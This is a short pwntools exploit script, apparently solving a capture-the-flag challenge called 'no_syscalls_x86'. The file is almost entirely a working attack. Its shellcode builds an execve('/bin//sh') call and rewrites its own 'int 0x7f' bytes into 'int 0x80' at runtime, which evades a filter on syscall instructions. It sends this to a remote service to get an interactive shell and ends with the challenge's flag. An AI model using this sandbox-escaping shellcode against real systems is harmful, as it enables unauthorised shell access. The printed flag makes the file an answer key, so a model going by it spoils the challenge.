#!/usr/bin/env python3
import pwn
import vpn_conf
import sys

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 4)
EXE_FILENAME = "./no_syscalls_x86"


def start():
    if sys.argv[1] == "remote":
        return pwn.remote(HOST, PORT)
    return pwn.ELF(EXE_FILENAME)


if __name__ == "__main__":
    io = start()

    shellcode = pwn.asm(
        """
    _start:
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx,esp
    mov ecx,eax
    mov edx,eax
    mov al,0xb

    call _incr

    _incr:
    pop edi
    inc byte ptr [edi + 5]
    .byte 0xcd
    .byte 0x7f
  """
    )

    # FORBIDDEN CODE
    # shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    io.recvuntil(b".")
    io.sendline(shellcode)
    io.interactive()


# BASC{s4ndb0X1n9_AiNt_3a5y}
